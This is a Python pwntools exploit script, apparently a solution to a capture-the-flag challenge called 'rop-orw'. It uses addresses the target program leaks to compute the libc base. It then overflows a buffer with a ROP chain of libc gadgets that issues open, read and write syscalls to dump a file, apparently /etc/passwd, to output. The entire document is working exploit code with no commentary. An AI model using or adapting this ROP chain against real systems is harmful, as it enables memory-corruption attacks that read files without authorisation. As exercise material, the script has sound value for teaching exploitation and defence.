from pwn import *

libc_file = "../libc.so.6.md5.5898fac5d2680d0d8fefdadd632b7188"
c = process("./rop-orw", env={'LD_PRELOAD': libc_file})
libc_file = ELF(libc_file)
elf_file = ELF("./rop-orw")

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(c, 'init-gef')

# leak data addr
c.recvuntil("data: ")
data_addr = int(c.recvline(), 16)
print(f"data_addr: {hex(data_addr)}")

# leak libc addr
c.recvuntil("puts libc: ")
puts_libc = int(c.recvline(), 16)
print(f"puts_libc: {hex(puts_libc)}")
libc_base = puts_libc - libc_file.symbols['puts']
print(f"libc_base: {hex(libc_base)}")

# elf is not PIE
etc_passwd_str = 0x402011

# gadgets
syscall = p64(libc_base + 0x00000000000630a9) # syscall ; ret
pop_rax = p64(libc_base + 0x0000000000036174) # pop rax ; ret
pop_rdi = p64(libc_base + 0x0000000000023b6a) # pop rdi ; ret
pop_rsi = p64(libc_base + 0x000000000002601f) # pop rsi ; ret
pop_rdx = p64(libc_base + 0x0000000000142c92) # pop rdx ; ret
pop_rcx_pop_rbx = p64(libc_base + 0x000000000010257e) # pop rcx ; pop rbx ; ret

# rop
payload =  b'a' * (0x14)

# open
payload += pop_rax
payload += p64(0x2)
payload += pop_rdi
payload += p64(etc_passwd_str)
payload += pop_rsi
payload += p64(0x0)
payload += pop_rdx
payload += p64(0x0)
payload += syscall

# read
payload += pop_rax
payload += p64(0x0)
payload += pop_rdi
payload += p64(0x3)
payload += pop_rsi
payload += p64(data_addr)
payload += pop_rdx
payload += p64(0x100)
payload += syscall

# write
payload += pop_rax
payload += p64(0x1)
payload += pop_rdi
payload += p64(0x1)
payload += pop_rsi
payload += p64(data_addr)
payload += pop_rdx
payload += p64(0x100)
payload += syscall

c.send(payload)

c.interactive()
c.close()